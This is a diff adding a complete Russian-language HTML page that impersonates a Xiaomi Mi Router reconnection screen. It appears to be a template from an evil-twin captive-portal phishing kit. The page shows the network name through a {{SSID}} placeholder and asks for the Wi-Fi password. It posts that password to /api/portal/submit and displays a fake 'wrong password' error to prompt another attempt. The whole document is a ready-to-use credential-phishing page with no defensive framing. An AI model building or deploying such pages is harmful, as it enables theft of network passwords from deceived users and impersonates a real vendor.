@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Mi Router — Подключение</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;min-height:100vh}
+.hdr{background:#FF6900;padding:0 20px;height:54px;display:flex;align-items:center;gap:12px}
+.mi-logo{width:38px;height:38px;background:#fff;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:17px;font-weight:900;color:#FF6900;letter-spacing:-1px}
+.hdr-title{color:#fff;font-size:18px;font-weight:700;letter-spacing:.3px}
+.hdr-sub{color:rgba(255,255,255,.7);font-size:12px;margin-left:auto}
+.hero{background:#FF6900;padding:20px 20px 44px}
+.hero h1{font-size:17px;font-weight:700;color:#fff;margin-bottom:6px}
+.hero p{font-size:13px;color:rgba(255,255,255,.85);line-height:1.6}
+.hero strong{color:#fff;font-weight:700}
+.wrap{max-width:420px;margin:-22px auto 0;padding:0 16px 36px;position:relative}
+.card{background:#fff;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.1);overflow:hidden}
+.card-hdr{background:#fff7f2;border-bottom:2px solid #FF6900;padding:11px 18px;font-size:13px;color:#FF6900;font-weight:700}
+.card-body{padding:20px 18px}
+.field{margin-bottom:14px}
+.field label{display:block;font-size:12px;color:#666;margin-bottom:5px;font-weight:600;text-transform:uppercase;letter-spacing:.4px}
+input[type=text],input[type=password]{width:100%;padding:11px 13px;border:1.5px solid #e0e0e0;border-radius:7px;font-size:14px;color:#333;outline:none;-webkit-appearance:none}
+input[type=text]:focus,input[type=password]:focus{border-color:#FF6900;box-shadow:0 0 0 3px rgba(255,105,0,.12)}
+input[readonly]{background:#fafafa;color:#999}
+.btn{width:100%;padding:13px;background:#FF6900;color:#fff;border:none;border-radius:7px;font-size:15px;font-weight:700;cursor:pointer;margin-top:6px;-webkit-appearance:none;position:relative;letter-spacing:.3px}
+.btn:active{background:#e05e00}
+.spin{display:none;position:absolute;right:16px;top:50%;transform:translateY(-50%);width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:translateY(-50%) rotate(360deg)}}
+.error{display:none;background:#fff5f2;border:1px solid #ffcdb3;border-radius:6px;padding:10px 12px;font-size:12px;color:#c94000;margin-top:10px;text-align:center}
+.footer{text-align:center;margin-top:14px;font-size:11px;color:#bbb}
+</style>
+</head>
+<body>
+<div class="hdr">
+  <div class="mi-logo">MI</div>
+  <span class="hdr-title">Mi Router</span>
+  <span class="hdr-sub">xiaomi.com</span>
+</div>
+<div class="hero">
+  <h1>Mi Router — переподключение</h1>
+  <p>Введите пароль сети <strong>{{SSID}}</strong> для восстановления доступа к интернету.</p>
+</div>
+<div class="wrap">
+  <div class="card">
+    <div class="card-hdr">Настройки беспроводной сети</div>
+    <div class="card-body">
+      <form method="POST" action="/api/portal/submit" id="frm">
+        <input type="hidden" name="ssid" value="{{SSID}}">
+        <input type="hidden" name="vendor" value="xiaomi">
+        <div class="field">
+          <label>Имя сети (SSID)</label>
+          <input type="text" value="{{SSID}}" readonly>
+        </div>
+        <div class="field">
+          <label>Пароль Wi-Fi</label>
+          <input type="password" name="password" placeholder="Введите пароль" required autocomplete="off" minlength="8">
+        </div>
+        <button type="submit" class="btn" id="sbtn">
+          Подключиться
+          <div class="spin" id="sp"></div>
+        </button>
+      </form>
+      <div class="error" id="err">Неверный пароль. Попробуйте ещё раз.</div>
+    </div>
+  </div>
+  <div class="footer">Xiaomi Inc. — Mi Router</div>
+</div>
+<script>
+document.getElementById('frm').addEventListener('submit',function(){
+  document.getElementById('sp').style.display='block';
+  document.getElementById('sbtn').disabled=true;
+});
+if(new URLSearchParams(location.search).get('err')){document.getElementById('err').style.display='block';}
+</script>
+</body>
+</html>
